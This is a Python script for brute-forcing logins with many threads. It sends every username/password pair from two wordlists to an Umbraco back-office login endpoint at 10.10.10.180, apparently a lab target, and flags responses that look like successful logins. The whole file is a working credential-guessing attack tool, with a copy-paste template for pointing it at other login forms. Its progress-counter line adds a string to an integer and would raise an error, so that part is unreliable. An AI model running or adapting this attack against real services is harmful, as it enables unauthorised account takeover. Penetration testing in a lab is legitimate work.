#See documentation on python multithreading: https://creativedata.stream/multi-threading-api-requests-in-python/
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

#This is the number of connection threads you will maintain with the target
#Lessen this if the target seems unable to keep up with the requests
MAX_THREADS=40

#In case you want to see results in burp history
proxies = {
   'http': 'http://127.0.0.1:8080'
}

#Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Define a singular session
session = requests.session()

#Open usernamelist and passwordlist
usernameFile = open("users.txt", "r")
usernameFileLines = usernameFile.readlines()
passwordFile = open("passwords.txt", "r")
passwordFileLines = passwordFile.readlines()


#Define a function which performs the login, provided two parameters.
#the function returns String 'report' which is created by us - this returns information about how the login attempt went
def attempt_login(username, password):
    #linux wordlists contain newline chars. strip them, else they show up in the request
    username = username.replace("\n", "")
    password = password.replace("\n", "")
    
    #Initialize as null, in case you are missing any in your paste
    burp0_headers = ""
    burp0_cookies = ""
    burp0_data = ""
    burp0_json = ""

    #------COPY/PASTE BEGIN HERE-----
    burp0_url = "http://10.10.10.180:80/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
    burp0_headers = {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "http://10.10.10.180", "Referer": "http://10.10.10.180/umbraco", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_json={"username": username, "password": password}
    #-----COPY/PASTE END HERE-----
    #REMOVE QUOTATIONS around parameters to ensure you're using function parameters and not literal strings
    #ie '"username"' -> 'username' (this is done in the example)

    #Perform web request
    response = session.post(burp0_url, headers=burp0_headers,
                            cookies=burp0_cookies, data=burp0_data, json=burp0_json, 
                            verify=False, stream=True, allow_redirects=False)
                            #Add ',proxies=proxies)' to proxy through burpsuite
    
    #Create report for this attempt
    result = "['" + username + "', '" + password + "', " + str(response.status_code) + ", " + str(len(response.content)) + "]"
    #Figure out the text that shows on the page after a bad sign in. Change 'failed' to be that text.
    if "failed" not in response.text and response.status_code <= 399:
        result += ", ***POSSIBLE SUCCESS***"
    elif "failed" in response.text:
        result += ", Sign-in failure detected"

    return result

#The 'main' method which will manage the threads 
#Manage meaning: (know the max number of threads, start new threads when available, 
#assign tasks to threads, handle completion action of threads)
def main():
    threads = []
    iterator = 0
    #Create a thread pool executor to manage threading
    #max_workers is maximum number of threads allowed at one time
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        #For every user and password combination:
        for username in usernameFileLines:
          for password in passwordFileLines:
              #use the executor to create a thread, assign it a task. Then, add the newly created thread to the 'threads' array
              #The task created is to call function attempt_login and pass parameter password
              threads.append(executor.submit(attempt_login, username, password))

    print("[User, Pass, Status Code, Response Size], Predicted Result")
    #When threads complete their assigned task, they return here to die
    for task in as_completed(threads):
        #Print the result returned by the thread task
        print(task.result())
        #Print to console every 500 attempts
        iterator += 1
        if iterator%500 == 0:
            print("NUMBER OF ATTEMPTS: " + iterator)
        
    print("\nComplete")

main()